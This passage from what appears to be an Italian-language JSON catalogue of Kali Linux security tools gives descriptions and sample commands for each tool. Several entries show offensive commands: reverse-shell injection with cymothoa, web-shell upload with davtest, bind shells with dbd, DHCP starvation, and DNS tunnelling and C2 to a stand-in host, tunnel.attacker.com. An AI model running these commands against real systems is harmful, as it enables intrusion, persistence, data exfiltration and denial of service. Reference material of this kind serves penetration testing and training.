  },
  {
    "id": "cymothoa",
    "name": "cymothoa",
    "version": "1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cymothoa/",
    "desc": "Inietta shellcode in processi Linux attivi per backdoor in-memory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cymothoa è uno strumento di stealth backdooring per Linux che inietta shellcode in processi già in esecuzione. Il codice malevolo vive solo in memoria, senza creare nuovi processi o file su disco, rendendo la detection molto più difficile. Include diversi payload predefiniti (reverse shell, bind shell) iniettabili in processi scelti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Process Injection:</strong> Usa ptrace per iniettare shellcode in qualsiasi processo esistente.</p><p><strong>Multiple Payloads:</strong> Include payload per reverse shell, bind shell e altre funzionalità backdoor.</p><p><strong>Fileless:</strong> Non scrive nulla su disco, la backdoor esiste solo in memoria RAM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lista payload disponibili\ncymothoa -S\n\n# Injection reverse shell in processo\ncymothoa -p <PID> -s 1 -y <attacker_port>\n\n# Con IP attacker specificato\ncymothoa -p <PID> -s 0 -y <port> -x <attacker_ip></code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Post-Exploitation</strong>, crea backdoor persistenti (finché il processo target è vivo) senza toccare il filesystem. Per <strong>Red Team</strong>, evita detection basata su file. In <strong>Persistence</strong>, se il processo target è un demone, la backdoor sopravvive al reboot.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Anomalie in memoria possono essere rilevate. Il processo target potrebbe crashare se l'injection fallisce.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "davtest",
    "name": "davtest",
    "version": "1.2",
    "icon": "../app/icons/davtest-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/davtest/",
    "desc": "Testa server WebDAV per upload di file e verificare esecuzione codice.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DAVTest automatizza il testing di server WebDAV per identificare se è possibile uploadare file eseguibili e ottenerne l'esecuzione. Testa sistematicamente diversi tipi di file (asp, aspx, php, jsp, txt, html) per determinare quali vengono accettati e quali possono essere eseguiti, identificando potenziali vettori di compromissione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Upload Testing:</strong> Prova a caricare file con diverse estensioni per vedere quali sono permesse.</p><p><strong>Execution Testing:</strong> Dopo l'upload, tenta di eseguire i file per verificare se il server li processa come script.</p><p><strong>MOVE Testing:</strong> Testa se file uploadati come txt possono essere rinominati in estensioni eseguibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test base\ndavtest -url http://target.com/webdav/\n\n# Con credenziali\ndavtest -url http://target.com/webdav/ -auth user:pass\n\n# Upload shell dopo test\ndavtest -url http://target.com/webdav/ -uploadfile shell.aspx -uploadloc shell.aspx</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando <strong>Nmap o nikto</strong> identificano WebDAV abilitato, DAVTest determina automaticamente quali file possono essere uploadati. Per <strong>IIS exploitation</strong>, WebDAV mal configurato è una vulnerabilità classica. Fase di reconnaissance prima dell'exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I file di test vengono uploadati e poi eliminati. Lascia tracce nei log WebDAV.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "dbd",
    "name": "dbd",
    "version": "1.50",
    "icon": "../app/icons/dbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dbd/",
    "desc": "Clone di netcat con crittografia AES e feature di evasione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DBD (Durandal's Backdoor) è un clone di netcat progettato per operazioni di red team. La differenza chiave è la crittografia AES-CBC-128 integrata che protegge tutto il traffico, rendendo difficile l'analisi del contenuto da parte di IDS/IPS. Include anche opzioni per respawning automatico della shell e detach dal terminale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES Encryption:</strong> Tutto il traffico è cifrato con AES-CBC-128 usando una shared key configurabile.</p><p><strong>Respawn:</strong> Può riavviare automaticamente la shell se la connessione cade.</p><p><strong>Stealth:</strong> Opzioni per detach, quiet mode e evasione di detection.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener con encryption\ndbd -l -p 4444 -e /bin/bash -k secretkey\n\n# Client connection\ndbd target.com 4444 -k secretkey\n\n# Bind shell con respawn\ndbd -l -p 4444 -r -e /bin/sh -k mykey</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reverse/Bind Shell</strong> quando il traffico netcat in chiaro verrebbe rilevato. In <strong>Red Team</strong>, la crittografia evita analisi del payload. Come sostituto di netcat quando è necessaria confidenzialità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il traffico cifrato è anomalo e può essere flaggato. Pattern di connessione persistenti possono essere rilevati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "dc3dd",
    "name": "dc3dd",
    "version": "7.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dc3dd/",
    "desc": "Versione forense di dd con hashing on-the-fly, progress bar e split.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DC3DD è una versione potenziata del comando dd sviluppata dal Department of Defense Cyber Crime Center (DC3) per acquisizioni forensi. Aggiunge funzionalità essenziali per le indagini: hashing on-the-fly per verifica integrità, progress bar, split automatico in file più piccoli, logging dettagliato e wiping sicuro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>On-the-fly Hashing:</strong> Calcola MD5, SHA1, SHA256 durante la copia, verificando integrità senza passaggi aggiuntivi.</p><p><strong>Split Output:</strong> Divide automaticamente l'output in file di dimensione specificata (utile per limitazioni FAT32).</p><p><strong>Progress Indicator:</strong> Mostra avanzamento della copia in tempo reale.</p><p><strong>Logging:</strong> Genera log dettagliati dell'operazione per documentazione forense.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Acquisizione con hash MD5 e SHA256\ndc3dd if=/dev/sda of=disk.img hash=md5 hash=sha256 log=acquisition.log\n\n# Con split in file da 2GB\ndc3dd if=/dev/sda of=disk.img.000 ofsz=2G hash=md5\n\n# Wiping sicuro\ndc3dd wipe=/dev/sda</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard per <strong>Acquisizioni Forensi</strong> in indagini legali dove la catena di custodia è critica. L'hashing simultaneo garantisce l'integrità senza rallentamenti. Per <strong>Incident Response</strong>, copia evidenze in modo forensicamente valido.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Best Practice:</strong> Usare write blocker hardware quando si acquisisce da evidence originale. Documentare tutti i parametri usati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "dcfldd",
    "name": "dcfldd",
    "version": "1.9.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dcfldd/",
    "desc": "Enhanced dd per forensics con hash multipli, progress e split output.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DCFLDD è un fork di GNU dd creato dal Department of Defense Computer Forensics Lab. Come dc3dd, aggiunge funzionalità forensi a dd: hashing on-the-fly, status output, verifica pattern, split output e capacità di scrivere su multipli output simultaneamente. È uno strumento consolidato nella community forense.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Outputs:</strong> Può scrivere contemporaneamente su file e dispositivi multipli (es. due copie forensi in parallelo).</p><p><strong>Hashing:</strong> Supporta MD5, SHA1, SHA256, SHA384, SHA512 durante la copia.</p><p><strong>Pattern Verify:</strong> Può verificare che un dispositivo contenga un pattern specifico (es. dopo wiping).</p><p><strong>Status Output:</strong> Progress bar e statistiche durante la copia.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Copia forense con hash\ndcfldd if=/dev/sda of=evidence.dd hash=md5,sha256 hashlog=hashes.txt\n\n# Output multipli\ndcfldd if=/dev/sda of=copy1.dd of=copy2.dd hash=md5\n\n# Verifica wipe\ndcfldd if=/dev/sda vf=/dev/zero</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Alternativa a dc3dd per <strong>Digital Forensics</strong>. L'output multiplo è utile quando si devono creare più copie identiche simultaneamente. Per <strong>Data Wiping</strong> con verifica, garantisce che il wipe sia completo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scelta:</strong> dc3dd e dcfldd sono funzionalmente simili. Usare quello con cui si ha più familiarità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "detect-it-easy",
    "name": "detect-it-easy",
    "version": "3.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/detect-it-easy/",
    "desc": "Identifica packer, compilatori e protector su eseguibili PE, ELF, Mach-O.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Detect It Easy (DIE) è un programma per identificare il tipo di file, compilatore, linker, packer e protector usati per creare un eseguibile. Supporta PE (Windows), ELF (Linux), Mach-O (macOS) e molti altri formati. È essenziale nel reverse engineering per capire come approcciare l'analisi di un binario prima di aprirlo in IDA o Ghidra.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Compiler Detection:</strong> Identifica Visual Studio, GCC, Clang, Delphi, Go, Rust e molti altri.</p><p><strong>Packer Detection:</strong> Riconosce UPX, ASPack, Themida, VMProtect e centinaia di altri packer/protector.</p><p><strong>Deep Scan:</strong> Analisi euristica per identificare protezioni sconosciute.</p><p><strong>Scripting:</strong> Database di signature estendibile con script JavaScript.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi da CLI\ndiec malware.exe\n\n# Con output dettagliato\ndiec -d malware.exe\n\n# Analisi ricorsiva directory\ndiec -r /path/to/samples/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo in ogni <strong>Malware Analysis</strong> per determinare se il sample è packed (richiede unpacking prima dell'analisi). Per <strong>CTF</strong>, identifica rapidamente il linguaggio/compilatore per orientare il reversing. In <strong>Vulnerability Research</strong>, capire le protezioni prima di cercare bug.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi Statica:</strong> Tool passivo, non esegue il sample. Sicuro da usare su malware.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "dex2jar",
    "name": "dex2jar",
    "version": "2.1~nightly",
    "icon": "../app/icons/dex2jar-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dex2jar/",
    "desc": "Converte file DEX Android in JAR per analisi con decompiler Java.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dex2jar converte file Dalvik Executable (DEX) di Android in file JAR contenenti bytecode Java standard. Questa conversione permette di utilizzare i potenti decompilatori Java esistenti (JD-GUI, Procyon, CFR) per analizzare app Android, ottenendo codice sorgente più leggibile rispetto al formato smali nativo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DEX to JAR:</strong> Converte classes.dex in file JAR con classi Java.</p><p><strong>APK Support:</strong> Può estrarre e convertire direttamente da file APK.</p><p><strong>Batch Processing:</strong> Supporta conversione di multipli file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Conversione DEX a JAR\nd2j-dex2jar classes.dex -o output.jar\n\n# Direttamente da APK\nd2j-dex2jar app.apk -o app.jar\n\n# Poi analizzare con JD-GUI\njd-gui output.jar</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Mobile Security</strong>, workflow classico: APK → dex2jar → JD-GUI per vedere il codice Java. Per <strong>Malware Analysis</strong> Android, facilita la comprensione della logica dell'app. Come passo intermedio prima dell'analisi con tool Java.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> jadx fa tutto in un passo (APK diretto a Java). dex2jar utile per workflow legacy o quando jadx ha problemi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "dhcpig",
    "name": "dhcpig",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dhcpig/",
    "desc": "Esaurisce il pool DHCP di una rete locale (DHCP starvation attack).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DHCPig esegue un attacco DHCP starvation che esaurisce tutti gli indirizzi IP disponibili nel pool del server DHCP. Invia richieste DHCP con MAC address diversi, ottenendo lease per ogni IP disponibile. Una volta esaurito il pool, i nuovi client legittimi non possono ottenere un indirizzo, risultando in un denial of service della rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pool Exhaustion:</strong> Richiede tutti gli IP disponibili con MAC spoofati.</p><p><strong>Rapid Mode:</strong> Modalità aggressiva per esaurire il pool rapidamente.</p><p><strong>Release All:</strong> Può rilasciare tutti i lease ottenuti per ripristinare la rete.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Esaurimento pool DHCP\npig.py eth0\n\n# Modalità aggressiva\npig.py -c eth0\n\n# Rilascio tutti i lease\npig.py -r eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Come preparazione per <strong>Rogue DHCP</strong>: esaurire il DHCP legittimo e poi fornire il proprio per diventare gateway (MITM). Per <strong>DoS Testing</strong> della resilienza della rete. Dimostra l'importanza di DHCP snooping.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Impatto:</strong> È un attacco distruttivo che causa DoS reale. Usare solo in lab o con autorizzazione esplicita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "dirb",
    "name": "dirb",
    "version": "2.22",
    "icon": "../app/icons/dirb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirb/",
    "desc": "Web content scanner per directory e file nascosti tramite dizionario.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DIRB è uno scanner web che trova directory e file nascosti tramite attacco a dizionario. Testa sistematicamente URL costruiti da una wordlist contro il server web, identificando risorse non linkate pubblicamente ma comunque accessibili. È uno dei tool classici per web content discovery, predecessore di gobuster e feroxbuster.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Prova ogni parola dalla wordlist come path sul server target.</p><p><strong>Extension Bruting:</strong> Può appendere estensioni (.php, .bak, .txt) a ogni path testato.</p><p><strong>Recursive Mode:</strong> Esplora ricorsivamente le directory trovate.</p><p><strong>Custom Headers:</strong> Supporta header custom, cookie e user agent.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione con wordlist medium e estensioni multiple\ndirb http://target.com/ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -X .php,.asp,.aspx,.html,.bak,.old,.txt,.zip -o results.txt\n\n# Con header cookie per area autenticata\ndirb http://target.com/dashboard/ -H \"Cookie: session=abc123; auth=xyz\"\n\n# Ignorare warning SSL e timeout custom\ndirb https://target.com/ -w -t 120\n\n# User-agent custom per evasione\ndirb http://target.com/ -a \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\"\n\n# Non ricorsivo (più veloce)\ndirb http://target.com/ -r\n\n# Basic auth\ndirb http://target.com/protected/ -u admin:password\n\n# Pipeline con altri tool\ndirb http://target.com/ -o dirs.txt &amp;&amp; \\\n  grep \"=&gt; DIRECTORY\" dirs.txt | awk '{print $1}' | xargs -I{} dirb {} -X .php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per trovare <strong>Admin Panels</strong> nascosti (/admin, /manager, /wp-admin). In <strong>Bug Bounty</strong>, scopre endpoint non documentati. Per <strong>Backup Files</strong>, trova .bak, .old, .swp dimenticati che possono esporre codice sorgente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Velocità:</strong> Più lento di gobuster/feroxbuster. Traffico riconoscibile da WAF. Usare delay se necessario.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dirbuster",
    "name": "dirbuster",
    "version": "1.0",
    "icon": "../app/icons/dirbuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirbuster/",
    "desc": "GUI Java per brute force di directory e file web con threading.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DirBuster è un'applicazione Java multi-threaded per brute forcing di directory e nomi file su server web. Sviluppata da OWASP, offre un'interfaccia grafica che rende facile configurare e monitorare gli attacchi. Include wordlist estese e può generare path anche tramite fuzzing puro. È il predecessore dei moderni tool CLI come gobuster.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-threaded:</strong> Configurabile fino a 200+ thread simultanei per massima velocità.</p><p><strong>GUI:</strong> Interfaccia grafica per configurazione, monitoraggio progressivo e visualizzazione risultati.</p><p><strong>Built-in Wordlists:</strong> Include diverse wordlist di dimensioni crescenti, dalla piccola alla enorme.</p><p><strong>Brute Force Mode:</strong> Può generare tutte le combinazioni di caratteri invece di usare una wordlist.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio GUI\ndirbuster\n\n# Workflow:\n# 1. Inserire target URL\n# 2. Selezionare wordlist\n# 3. Configurare thread e estensioni\n# 4. Start e monitorare i risultati</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per chi preferisce <strong>interfacce grafiche</strong> a CLI. La visualizzazione del progresso è utile per scan lunghi. Ancora usato in alcuni <strong>OSCP/certification</strong> workflow. Buono per <strong>formazione</strong> e comprensione del concetto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> gobuster e feroxbuster sono più veloci e preferiti per uso professionale. DirBuster è più datato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dirsearch",
    "name": "dirsearch",
    "version": "0.4.3",
    "icon": "../app/icons/dirsearch-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirsearch/",
    "desc": "Brute forcer di directory web veloce con estensioni multiple e ricorsione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dirsearch è un tool Python avanzato per la content discovery web. Si distingue per le wordlist integrate di alta qualità, la gestione intelligente delle estensioni (testa automaticamente .php, .html, .js per ogni path) e l'output chiaro e colorato. È più user-friendly di gobuster pur mantenendo ottime performance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Extensions:</strong> Testa automaticamente ogni path con multiple estensioni configurabili.</p><p><strong>Recursive Mode:</strong> Esplora automaticamente le directory trovate.</p><p><strong>Response Filtering:</strong> Filtra risultati per status code, size e pattern nel contenuto.</p><p><strong>Multiple Targets:</strong> Può scansionare lista di target da file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione completa con esclusioni intelligenti\ndirsearch -u http://target.com/ -e php,asp,aspx,jsp,bak,old,zip \\\n  --exclude-status=404,403,500 --exclude-sizes=0B --random-agent\n\n# Ricorsivo con depth e output JSON\ndirsearch -u http://target.com/ -r --max-recursion-depth=3 -t 50 -o results.json --format=json\n\n# Con autenticazione e cookie\ndirsearch -u http://target.com/admin/ -H \"Authorization: Bearer TOKEN\" \\\n  -H \"Cookie: session=abc123\" -e php\n\n# Wordlist custom + built-in\ndirsearch -u http://target.com/ -w /usr/share/seclists/Discovery/Web-Content/big.txt \\\n  --suffixes=~,.bak,.swp,.orig\n\n# Bulk scan da lista URL\ndirsearch -l urls.txt -e php -t 30 -q --plain-text-report=results.txt\n\n# Force extensions su tutti i path\ndirsearch -u http://target.com/ -e php --force-extensions\n\n# Proxy per analisi Burp\ndirsearch -u http://target.com/ --proxy=http://127.0.0.1:8080 --tor\n\n# Delay per rate limiting\ndirsearch -u http://target.com/ --delay=0.5 -t 10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Preferito per <strong>Bug Bounty</strong> per la combinazione di velocità e funzionalità. Le wordlist integrate sono ottimizzate. Per <strong>Web Pentesting</strong> quotidiano quando si vuole un tool semplice ma potente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Come tutti i fuzzer, genera molto traffico. Usare --delay per rate limiting.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dislocker",
    "name": "dislocker",
    "version": "0.7.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dislocker/",
    "desc": "Decritta volumi BitLocker usando recovery key, password o VMK.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dislocker permette di montare e accedere a volumi cifrati con BitLocker da Linux. Supporta vari metodi di autenticazione: recovery key (48 cifre), password utente, BEK file (startup key) o direttamente il VMK (Volume Master Key) se già estratto. È essenziale per forensics su sistemi Windows moderni dove BitLocker è sempre più comune.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Auth Methods:</strong> Recovery key, password, BEK file, VMK/FVEK diretto.</p><p><strong>FUSE Mount:</strong> Presenta il volume decifrato come file virtuale montabile.</p><p><strong>Read/Write:</strong> Supporta sia lettura che scrittura (attenzione in forensics!).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Con recovery key\ndislocker -r -V /dev/sda1 -p123456-123456-123456-123456-123456-123456-123456-123456 /mnt/decrypted\n\n# Con password\ndislocker -r -V /dev/sda1 -uMyPassword /mnt/decrypted\n\n# Montare il file decifrato\nmount -o loop /mnt/decrypted/dislocker-file /mnt/windows</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, analizza dischi BitLocker quando si ha la recovery key (spesso salvata in AD). Per <strong>Incident Response</strong>, accede a sistemi compromessi con encryption. Per <strong>Recovery</strong>, quando Windows non boota ma si ha la key.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Forense:</strong> Usare -r (read-only) per preservare l'integrità. Lavorare sempre su copie.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "dmitry",
    "name": "dmitry",
    "version": "1.3a",
    "icon": "../app/icons/dmitry-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dmitry/",
    "desc": "Tool OSINT per whois, subdomain enum, email harvesting e port scan.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DMitry (Deepmagic Information Gathering Tool) è un'utility all-in-one per la raccolta di informazioni su un dominio. Esegue whois lookup, ricerca sottodomini, estrae email dai risultati, esegue port scan TCP e raccoglie informazioni da Netcraft. È un tool legacy ma ancora utile per reconnaissance rapida con un singolo comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Whois Lookup:</strong> Interroga database WHOIS per informazioni di registrazione.</p><p><strong>Subdomain Search:</strong> Cerca sottodomini usando tecniche passive.</p><p><strong>Email Harvesting:</strong> Estrae indirizzi email associati al dominio.</p><p><strong>Port Scanning:</strong> TCP connect scan base su porte comuni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tutte le funzionalità\ndmitry -winsepbo output.txt target.com\n\n# Solo whois e subdomains\ndmitry -ws target.com\n\n# Con port scan\ndmitry -p target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Recon</strong> iniziale su un target. Quando serve un'overview rapida senza configurare tool più complessi. Per <strong>CTF</strong> e learning, mostra le basi della reconnaissance.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> Tool più moderni (Amass, subfinder, theHarvester) sono più potenti. DMitry è più per uso legacy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dns2tcp",
    "name": "dns2tcp",
    "version": "0.5.2",
    "icon": "../app/icons/dns2tcp-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dns2tcp/",
    "desc": "Tunneling TCP su DNS per bypassare firewall restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dns2tcp incapsula connessioni TCP in query e response DNS, permettendo di bypassare firewall che bloccano tutto il traffico tranne DNS. Il client codifica i dati in query DNS verso un server autoritativo controllato, che risponde con i dati del servizio richiesto. È più lento di tunnel HTTP ma funziona dove altri falliscono.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DNS Tunneling:</strong> Incapsula qualsiasi connessione TCP in traffico DNS.</p><p><strong>Multiple Resources:</strong> Il server può esporre più servizi con nomi diversi.</p><p><strong>Compression:</strong> Supporta compressione per migliorare throughput.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (su infrastruttura controllata)\ndns2tcpd -f dns2tcpd.conf\n\n# Client (dalla rete restrittiva)\ndns2tcpc -r ssh -z tunnel.attacker.com -d 1 -l 4430\n\n# Poi connettersi a localhost:4430 per SSH</code></pre><p>Richiede un dominio controllato con record NS che punta al server.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bypassing</strong> firewall in hotel, aeroporti o reti aziendali che permettono solo DNS. In <strong>Red Team</strong>, esfiltrazione dati quando altri canali sono bloccati. Per accedere a risorse quando solo porta 53 è aperta.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Query DNS anomale (lunghe, frequenti, TXT records) sono rilevabili. Molto lento rispetto a tunnel HTTP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "dnscat2",
    "name": "dnscat2",
    "version": "0.07",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnscat2/",
    "desc": "C2 e tunnel su DNS per comunicazioni nascoste in ambienti restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dnscat2 è un framework C2 completo che opera interamente su DNS, progettato per ambienti dove l'unico traffico permesso è verso server DNS. Fornisce shell interattive, upload/download file e port forwarding, tutto nascosto in query DNS legittime. Include sia il server (Ruby) che client (C) cross-platform.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Command Shell:</strong> Shell interattiva sul target via DNS.</p><p><strong>File Transfer:</strong> Upload e download file attraverso il tunnel.</p><p><strong>Port Forwarding:</strong> Crea tunnel per raggiungere servizi interni.</p><p><strong>Encryption:</strong> Tutto il traffico è cifrato end-to-end.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (attacker)\nruby dnscat2.rb tunnel.attacker.com\n\n# Client (target)\n./dnscat --dns server=tunnel.attacker.com\n\n# Dal server, interagire:\ndnscat2> session -i 1\ncommand> shell</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Team</strong>, quando egress filtering blocca tutto tranne DNS. Per <strong>Covert C2</strong> in ambienti ad alta sorveglianza dove HTTP/HTTPS sono monitorati. Backup C2 channel quando il primario è bloccato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il volume di query DNS è anomalo. I SOC moderni monitorano DNS tunneling. Usare con moderazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "dnschef",
    "name": "dnschef",
    "version": "0.4",
    "icon": "../app/icons/dnschef-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnschef/",
    "desc": "Proxy DNS per spoofing risposte e redirect traffico durante MITM.",
